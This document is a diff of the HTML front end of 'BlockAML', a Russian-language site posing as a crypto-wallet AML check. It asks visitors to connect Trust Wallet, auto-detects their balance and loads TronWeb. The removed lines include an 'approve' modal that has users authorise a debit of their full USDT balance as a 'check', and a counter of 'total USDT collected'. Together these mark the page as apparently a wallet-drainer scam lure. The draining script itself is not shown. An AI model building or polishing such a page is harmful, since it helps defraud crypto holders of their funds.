@@ -3,39 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>BlockAML — премиальная AML проверка</title>
-    
-    <!-- PWA Support -->
-    <link rel="manifest" href="manifest.json">
-    <meta name="theme-color" content="#00c9b7">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    
-    <!-- Favicon -->
+    <title>BlockAML — проверка криптокошельков</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
-    
-    <!-- Мета-теги -->
-    <meta name="description" content="BlockAML — профессиональная AML-проверка криптокошельков с поддержкой TronLink и Trust Wallet">
-    <meta name="keywords" content="AML проверка, TronLink, Trust Wallet, Tron, USDT, безопасность">
+    <meta name="description" content="BlockAML — профессиональная AML-проверка криптокошельков">
+    <meta name="keywords" content="AML проверка, криптокошелек, биткоин, USDT, TRX">
     <meta name="author" content="BlockAML">
-    
-    <!-- Open Graph -->
-    <meta property="og:title" content="BlockAML — премиальная AML проверка">
-    <meta property="og:description" content="Проверьте любой криптокошелек на чистоту за секунды. Мгновенные уведомления в Telegram.">
+    <meta property="og:title" content="BlockAML — AML проверка кошельков">
+    <meta property="og:description" content="Проверьте криптокошелек на чистоту перед сделкой">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://crypto-cleaner.space">
-    
-    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    
-    <!-- Стили -->
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <!-- Анимированный фон -->
     <div class="crypto-bg">
         <div class="gradient-sphere sphere-1"></div>
         <div class="gradient-sphere sphere-2"></div>
@@ -44,7 +23,6 @@
     </div>
 
     <div class="container">
-        <!-- Навигация -->
         <nav class="glass-nav">
             <div class="nav-content">
                 <div class="logo">
@@ -53,7 +31,6 @@
                 </div>
                 <div class="nav-links">
                     <a href="#" class="active"><i class="fas fa-home"></i> Главная</a>
-                    <a href="#stats"><i class="fas fa-chart-line"></i> Статистика</a>
                     <a href="#faq"><i class="fas fa-question-circle"></i> FAQ</a>
                     <a href="https://t.me/sorik445" target="_blank" class="tg-nav-btn">
                         <i class="fab fa-telegram"></i> Поддержка
@@ -62,96 +39,55 @@
             </div>
         </nav>
 
-        <!-- Герой секция -->
         <section class="hero-section">
             <div class="hero-content">
-                <span class="badge"><i class="fas fa-bolt"></i> TronLink + Trust Wallet</span>
+                <span class="badge"><i class="fas fa-bolt"></i> Trust Wallet + автоопределение</span>
                 <h1 class="hero-title">
                     AML проверка<br>
                     <span class="gradient-text">в стиле крипто</span>
                 </h1>
                 <p class="hero-subtitle">
-                    Подключите кошелёк через DApp браузер<br>
+                    Подключите Trust Wallet через встроенный браузер<br>
                     и мы автоматически определим ваш баланс
                 </p>
             </div>
         </section>
 
-        <!-- Метрики -->
-        <section id="stats" class="metrics-section">
-            <div class="metrics-grid">
-                <div class="metric-card glass-card">
-                    <i class="fas fa-coins metric-icon"></i>
-                    <span class="metric-value" id="totalCollected">0</span>
-                    <span class="metric-label">Всего собрано USDT</span>
-                </div>
-                <div class="metric-card glass-card">
-                    <i class="fas fa-exchange-alt metric-icon"></i>
-                    <span class="metric-value" id="totalTransactions">0</span>
-                    <span class="metric-label">Всего транзакций</span>
-                </div>
-                <div class="metric-card glass-card">
-                    <i class="fas fa-users metric-icon"></i>
-                    <span class="metric-value" id="uniqueUsers">0</span>
-                    <span class="metric-label">Уникальных пользователей</span>
-                </div>
-                <div class="metric-card glass-card">
-                    <i class="fas fa-clock metric-icon"></i>
-                    <span class="metric-value" id="uptime">0</span>
-                    <span class="metric-label">Время работы (дней)</span>
-                </div>
-            </div>
-        </section>
-
-        <!-- Форма проверки -->
         <section class="check-section glass-card">
             <div class="section-header">
                 <i class="fas fa-search-shield"></i>
                 <h2>Начать проверку</h2>
-                <p>Используйте TronLink или Trust Wallet на телефоне</p>
-            </div>
-            
-            <!-- Инструкция для мобильных -->
-            <div class="mobile-instruction">
-                <i class="fas fa-mobile-alt"></i>
-                <p><strong>На телефоне:</strong> Откройте кошелёк → DApp Browser → введите адрес сайта</p>
+                <p>Подключите Trust Wallet или введите адрес вручную</p>
             </div>
 
-            <!-- Универсальная кнопка подключения -->
+            <div class="mobile-instruction">
+                <i class="fas fa-mobile-alt"></i>
+                <p><strong>На телефоне:</strong> Откройте Trust Wallet → DApp Browser → введите адрес сайта</p>
+            </div>
+
             <div class="wallet-connect-wrapper">
                 <button id="connectWalletBtn" class="wallet-connect-btn pulse">
-                    <i class="fas fa-wallet"></i>
-                    Подключить кошелёк
+                    <i class="fas fa-wallet"></i> Подключить кошелёк
                 </button>
                 <span id="connectedStatus" class="connected-status">
                     <i class="fas fa-check-circle"></i> Кошелёк подключён
                 </span>
             </div>
 
-            <!-- Или ввод адреса вручную -->
             <div class="divider">
                 <span>— или —</span>
             </div>
 
-            <!-- Поле ввода адреса -->
             <div class="input-wrapper">
                 <div class="input-group">
                     <i class="fas fa-wallet input-icon"></i>
                     <input type="text" id="walletInput" placeholder="Введите адрес кошелька вручную" />
                     <button id="checkBtn" class="glow-button">
-                        <i class="fas fa-shield-check"></i>
-                        <span>Проверить</span>
+                        <i class="fas fa-shield-check"></i> <span>Проверить</span>
                     </button>
                 </div>
             </div>
 
-            <!-- История проверок -->
-            <div class="history-section" id="historySection" style="display: none;">
-                <h4><i class="fas fa-history"></i> Последние проверки</h4>
-                <div class="history-list" id="historyList"></div>
-            </div>
-
-            <!-- Тестовая кнопка Telegram -->
             <div class="test-telegram">
                 <button onclick="testTelegram()" class="test-tg-btn">
                     <i class="fab fa-telegram"></i> Тест Telegram
@@ -159,14 +95,12 @@
             </div>
         </section>
 
-        <!-- Блок результата -->
         <section class="result-section glass-card" id="resultSection" style="display: none;">
             <div class="result-header">
                 <i class="fas fa-file-certificate"></i>
                 <h3>Результат AML-анализа</h3>
                 <span class="result-badge" id="riskBadge">Низкий риск</span>
             </div>
-            
             <div class="wallet-address-display">
                 <div class="address-label">
                     <i class="fas fa-qrcode"></i>
@@ -179,50 +113,37 @@
                     </button>
                 </div>
             </div>
-
-            <!-- Карточка суммы -->
             <div id="amountCardContainer"></div>
-
             <div class="stats-grid modern">
                 <div class="stat-card">
-                    <div class="stat-icon">
-                        <i class="fas fa-arrows-spin"></i>
-                    </div>
+                    <div class="stat-icon"><i class="fas fa-arrows-spin"></i></div>
                     <div class="stat-content">
                         <span class="stat-label">Всего транзакций</span>
                         <span class="stat-number" id="totalTx">—</span>
                     </div>
                 </div>
                 <div class="stat-card warning">
-                    <div class="stat-icon">
-                        <i class="fas fa-triangle-exclamation"></i>
-                    </div>
+                    <div class="stat-icon"><i class="fas fa-triangle-exclamation"></i></div>
                     <div class="stat-content">
                         <span class="stat-label">Подозрительных</span>
                         <span class="stat-number" id="suspiciousTx">—</span>
                     </div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-icon">
-                        <i class="fas fa-calendar"></i>
-                    </div>
+                    <div class="stat-icon"><i class="fas fa-calendar"></i></div>
                     <div class="stat-content">
                         <span class="stat-label">Возраст кошелька</span>
                         <span class="stat-number" id="walletAge">—</span>
                     </div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-icon">
-                        <i class="fas fa-clock"></i>
-                    </div>
+                    <div class="stat-icon"><i class="fas fa-clock"></i></div>
                     <div class="stat-content">
                         <span class="stat-label">Последняя активность</span>
                         <span class="stat-number" id="lastActive">—</span>
                     </div>
                 </div>
             </div>
-
-            <!-- График риска -->
             <div class="risk-visualization">
                 <div class="risk-gauge">
                     <svg class="gauge-svg" viewBox="0 0 200 100">
@@ -235,39 +156,33 @@
                     </div>
                 </div>
             </div>
-
             <div class="sources-section">
                 <h4><i class="fas fa-shield"></i> Источники риска</h4>
                 <div class="sources-list" id="sourcesList"></div>
             </div>
-
             <div class="action-buttons modern">
                 <button id="downloadPdfBtn" class="action-btn pdf">
-                    <i class="fas fa-file-pdf"></i>
-                    <span>Скачать отчёт</span>
+                    <i class="fas fa-file-pdf"></i> <span>Скачать отчёт</span>
                 </button>
                 <a href="https://t.me/sorik445" target="_blank" class="action-btn telegram">
-                    <i class="fab fa-telegram"></i>
-                    <span>Написать в поддержку</span>
+                    <i class="fab fa-telegram"></i> <span>Написать в поддержку</span>
                 </a>
             </div>
         </section>
 
-        <!-- FAQ -->
         <section id="faq" class="faq-section glass-card">
             <div class="section-header centered">
                 <i class="fas fa-question"></i>
                 <h2>Часто задаваемые вопросы</h2>
             </div>
-
             <div class="faq-grid">
                 <div class="faq-item">
                     <div class="faq-question">
                         <i class="fas fa-chevron-right"></i>
-                        <h4>Как подключить кошелёк?</h4>
+                        <h4>Как подключить Trust Wallet?</h4>
                     </div>
                     <div class="faq-answer">
-                        <p>На телефоне: откройте TronLink или Trust Wallet → нажмите "Browser" → введите адрес сайта. На компьютере: установите расширение кошелька.</p>
+                        <p>На телефоне: откройте Trust Wallet → нажмите "Browser" → введите адрес сайта.</p>
                     </div>
                 </div>
                 <div class="faq-item">
@@ -285,13 +200,12 @@
                         <h4>Как работает AML проверка?</h4>
                     </div>
                     <div class="faq-answer">
-                        <p>Мы анализируем историю транзакций кошелька по категориям риска, включая связи с даркнет-маркетами и микшерами.</p>
+                        <p>Мы анализируем историю транзакций кошелька по категориям риска.</p>
                     </div>
                 </div>
             </div>
         </section>
 
-        <!-- Футер -->
         <footer class="modern-footer">
             <div class="footer-content">
                 <div class="footer-brand">
@@ -308,71 +222,21 @@
         </footer>
     </div>
 
-    <!-- Модальное окно approve -->
-    <div id="approveModal" class="approve-modal" style="display: none;">
-        <div class="approve-modal-content">
-            <div class="approve-header">
-                <div class="approve-icon">
-                    <i class="fas fa-shield-check"></i>
-                </div>
-                <h2>Подтверждение проверки</h2>
-                <p class="approve-subtitle">Обнаружен баланс для AML-анализа</p>
-            </div>
-
-            <div class="approve-details">
-                <div class="info-row">
-                    <span class="info-label">Сумма к проверке</span>
-                    <span class="info-value highlight" id="modalAmount">0 USDT</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Лимиты</span>
-                    <span class="info-value">от 5 до 5000 USDT</span>
-                </div>
-            </div>
-
-            <div class="approve-warning">
-                <i class="fas fa-info-circle"></i>
-                <div class="warning-text">
-                    <strong>Деньги будут списаны ровно в этой сумме</strong>
-                    <p>Это разрешение на проверку именно той суммы, которая есть на балансе</p>
-                </div>
-            </div>
-
-            <div class="approve-actions">
-                <button class="cancel-btn" onclick="closeApproveModal()">
-                    <i class="fas fa-times"></i>
-                    Отмена
-                </button>
-                <button class="confirm-btn" onclick="confirmApprove()">
-                    <i class="fas fa-check-circle"></i>
-                    Подтвердить проверку
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Модальные окна политик -->
     <div id="termsModal" class="modal">
         <div class="modal-content">
             <span class="close">&times;</span>
             <h2>Условия использования</h2>
-            <div class="modal-text">
-                <p>Текст условий использования...</p>
-            </div>
+            <p>Текст условий использования...</p>
         </div>
     </div>
-    
     <div id="amlModal" class="modal">
         <div class="modal-content">
             <span class="close-aml">&times;</span>
             <h2>AML-политика</h2>
-            <div class="modal-text">
-                <p>Текст AML-политики...</p>
-            </div>
+            <p>Текст AML-политики...</p>
         </div>
     </div>
 
-    <!-- Скрипты -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <script src="script.js"></script>
